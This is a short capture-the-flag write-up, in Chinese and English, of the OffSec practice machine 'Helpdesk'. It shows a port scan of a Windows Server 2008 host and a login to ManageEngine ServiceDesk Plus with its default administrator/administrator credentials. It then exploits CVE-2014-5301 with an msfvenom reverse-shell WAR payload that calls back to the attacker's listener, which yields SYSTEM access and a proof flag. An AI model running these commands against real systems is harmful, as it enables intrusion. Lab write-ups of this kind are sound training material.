###### tags: `Offsec` `PG Practice` `Easy` `Windows`

# Helpdesk
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.169.43 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.169.43:135
Open 192.168.169.43:139
Open 192.168.169.43:445
Open 192.168.169.43:3389
Open 192.168.169.43:8080

PORT     STATE SERVICE       REASON  VERSION
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Service
8080/tcp open  http          syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-title: ManageEngine ServiceDesk Plus
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46893/tcp): CLEAN (Timeout)
|   Check 2 (port 60042/tcp): CLEAN (Timeout)
|   Check 3 (port 32722/udp): CLEAN (Timeout)
|   Check 4 (port 38141/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-25T10:29:55
|_  start_date: 2024-04-25T10:27:14
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-25T03:29:55-07:00
| nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:e4:e6 (VMware)
| Names:
|   HELPDESK<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   HELPDESK<20>         Flags: <unique><active>
| Statistics:
|   00:50:56:ab:e4:e6:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

搜尋`manageengine servicedesk plus default credentials`可以找到defualt credential是`administrator/administrator`
找到[CVE-2014-5301.py](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py)，照他上面使用
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445

┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.236 LPORT=445 -f war > shell.war

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 CVE-2014-5301.py 192.168.169.43 8080 administrator administrator shell.war
```

進去之後直接是`Administrator`權限，在`C:\Users\Administrator\Desktop`得proof.txt
```
C:\ManageEngine>whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
6e33d27114b56511c9beed098df783c
```